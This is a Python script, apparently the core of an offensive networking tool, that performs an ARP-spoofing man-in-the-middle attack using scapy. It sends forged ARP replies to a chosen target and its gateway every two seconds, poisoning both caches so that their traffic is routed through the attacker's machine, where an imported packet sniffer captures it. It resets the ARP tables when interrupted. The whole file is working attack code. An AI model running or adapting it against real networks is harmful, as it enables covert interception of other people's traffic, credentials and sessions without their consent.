from macaddress import MACAddress
from customtypes import MACAddr
from sniffer import PacketSniffer
from args import ArgParser

import scapy.all as scapy

from colorama import Fore
from colorama import init

import platform
import time
import sys


class ManInTheMiddle:

    @classmethod
    def spoofer(cls, target_ip, spoof_ip) -> None:
        target_mac: MACAddr = MACAddress.get(target_ip)

        packet = scapy.ARP(
            op=2,
            pdst=target_ip,
            hwdst=target_mac,
            psrc=spoof_ip
        )
        scapy.send(packet, verbose=False)

    @classmethod
    def restore(cls, destination_ip, source_ip) -> None:
        destination_mac: MACAddr = MACAddress.get(destination_ip)
        source_mac: MACAddr = MACAddress.get(source_ip)

        packet = scapy.ARP(
            op=2,
            pdst=destination_ip,
            hwdst=destination_mac,
            psrc=source_ip,
            hwsrc=source_mac
        )
        scapy.send(packet, count=4, verbose=False)


def main() -> None:
    system: str = platform.system().lower()
    args = ArgParser().handler(system)

    try:
        sent_packets_count = 0
        PacketSniffer.start()
        while True:
            ManInTheMiddle.spoofer(args.target, args.gateway)
            ManInTheMiddle.spoofer(args.gateway, args.target)

            print(f'{Fore.GREEN}[+] SENT PACKETS: {str(sent_packets_count)}...'),
            sys.stdout.flush()
            sent_packets_count +=2
            time.sleep(2)
    except KeyboardInterrupt:
        print(f'{Fore.YELLOW}[!] INTERRUPTED SPOOFING FOUND...')
        print(f'{Fore.YELLOW}[!] DETECTED CTRL + C...')
        print(f'{Fore.YELLOW}[!] RESTORING TO NORMAL STATE | RESETTING ARP TABLES...')
    finally:
        ManInTheMiddle.restore(args.target, args.gateway)
        ManInTheMiddle.restore(args.gateway, args.target)


if __name__ == '__main__':
    init(autoreset=True)
    main()
